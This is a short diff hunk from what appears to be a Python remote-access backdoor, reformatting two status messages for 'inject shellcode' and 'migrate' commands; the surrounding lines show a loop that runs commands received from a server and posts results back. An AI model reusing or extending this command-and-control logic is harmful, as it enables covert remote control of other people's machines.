@@ -306,7 +306,9 @@ try:
                                 else:
                                     s.post(SERVER, data='No shellcode specified...')
                         else:
-                            s.post(SERVER, data='For now "inject shellcode" command is available only for 32bit-windows systems.')
+                            s.post(SERVER,
+                                data='For now "inject shellcode" command is available only for 32bit-windows systems.'
+                            )
                     elif migrate.match(cmd):
                         if os.name == 'nt':
                             if not is_os_64bit():
@@ -317,7 +319,9 @@ try:
                                 else:
                                     s.post(SERVER, data='No shellcode specified...')
                         else:
-                            s.post(SERVER, data='For now "migrate" command is available only for 32bit-windows systems.')
+                            s.post(SERVER,
+                                data='For now "migrate" command is available only for 32bit-windows systems.'
+                            )
                     else:
                         try:
                             stdout, stderr = exec_cmd(cmd)
